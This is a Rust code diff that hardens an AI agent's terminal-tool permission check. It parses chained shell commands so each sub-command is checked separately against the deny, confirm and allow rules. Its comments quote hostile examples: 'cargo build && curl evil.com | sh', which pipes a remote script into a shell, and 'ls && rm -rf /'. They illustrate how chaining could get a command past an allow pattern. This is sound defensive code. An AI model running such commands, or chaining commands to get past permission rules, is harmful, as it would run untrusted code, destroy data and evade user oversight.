@@ -1,3 +1,4 @@
+use crate::shell_parser::extract_commands;
 use acp_thread::{
     AgentConnection, AgentSessionInfo, AgentSessionList, AgentSessionListRequest,
     AgentSessionListResponse,
@@ -1152,18 +1153,33 @@ enum AcpPermissionDecision {
 /// This replicates the core logic of `decide_permission_from_settings` from the agent crate
 /// so that ACP code paths respect `always_deny`, `always_allow`, and `always_confirm` patterns
 /// in addition to the tool's `default` mode.
+///
+/// For the terminal tool, the input is parsed into sub-commands so that chained commands
+/// like `cargo build && curl evil.com | sh` are checked individually. This prevents a
+/// pattern like `^cargo` from auto-allowing the entire chain.
 fn check_acp_tool_permission(
     tool_name: &str,
     input: &str,
     settings: &AgentSettings,
 ) -> AcpPermissionDecision {
+    // For the terminal tool, parse the command into sub-commands so that
+    // chained commands are checked individually rather than as a single string.
+    let is_terminal = tool_name == "terminal";
+    let extracted_commands = if is_terminal {
+        extract_commands(input)
+    } else {
+        None
+    };
+
     // Check hardcoded security rules first (e.g. blocking "rm -rf /").
-    // We pass None for extracted_commands since the ACP code doesn't have
-    // access to the shell parser, but the raw input check still catches
-    // simple dangerous commands.
-    if let Some(denial) =
-        agent_settings::check_hardcoded_security_rules(tool_name, "terminal", input, None)
-    {
+    // Pass extracted sub-commands so hardcoded rules catch chained attacks
+    // like "ls && rm -rf /".
+    if let Some(denial) = agent_settings::check_hardcoded_security_rules(
+        tool_name,
+        "terminal",
+        input,
+        extracted_commands.as_deref(),
+    ) {
         return AcpPermissionDecision::Deny(denial);
     }
 
@@ -1195,28 +1211,54 @@ fn check_acp_tool_permission(
         ));
     }
 
-    // Deny takes highest precedence
-    for pattern in &rules.always_deny {
-        if pattern.is_match(input) {
-            return AcpPermissionDecision::Deny(format!(
-                "Blocked by always_deny pattern: {}",
-                pattern.pattern
-            ));
+    // For the terminal tool, check each sub-command individually:
+    // - DENY: if ANY sub-command matches a deny pattern, deny the whole thing
+    // - CONFIRM: if ANY sub-command matches a confirm pattern, confirm the whole thing
+    // - ALLOW: ALL sub-commands must match at least one allow pattern
+    //
+    // If parsing failed (extracted_commands is None), disable always_allow so we
+    // don't auto-allow potentially dangerous unparseable commands.
+    let allow_enabled = !is_terminal || extracted_commands.is_some();
+    let commands: Vec<String> = if is_terminal {
+        extracted_commands.unwrap_or_else(|| vec![input.to_string()])
+    } else {
+        vec![input.to_string()]
+    };
+
+    let mut any_matched_confirm = false;
+    let mut all_matched_allow = true;
+    let mut had_any_commands = false;
+
+    for command in &commands {
+        had_any_commands = true;
+
+        // DENY: immediate return if any command matches a deny pattern
+        for pattern in &rules.always_deny {
+            if pattern.is_match(command) {
+                return AcpPermissionDecision::Deny(format!(
+                    "Blocked by always_deny pattern: {}",
+                    pattern.pattern
+                ));
+            }
+        }
+
+        // CONFIRM: remember if any command matches a confirm pattern
+        if rules.always_confirm.iter().any(|r| r.is_match(command)) {
+            any_matched_confirm = true;
+        }
+
+        // ALLOW: track if all commands match at least one allow pattern
+        if !rules.always_allow.iter().any(|r| r.is_match(command)) {
+            all_matched_allow = false;
         }
     }
 
-    // Confirm takes precedence over allow
-    for pattern in &rules.always_confirm {
-        if pattern.is_match(input) {
-            return AcpPermissionDecision::Confirm;
-        }
+    if any_matched_confirm {
+        return AcpPermissionDecision::Confirm;
     }
 
-    // Allow patterns
-    for pattern in &rules.always_allow {
-        if pattern.is_match(input) {
-            return AcpPermissionDecision::Allow;
-        }
+    if allow_enabled && all_matched_allow && had_any_commands {
+        return AcpPermissionDecision::Allow;
     }
 
     // Fall back to tool-specific or global default
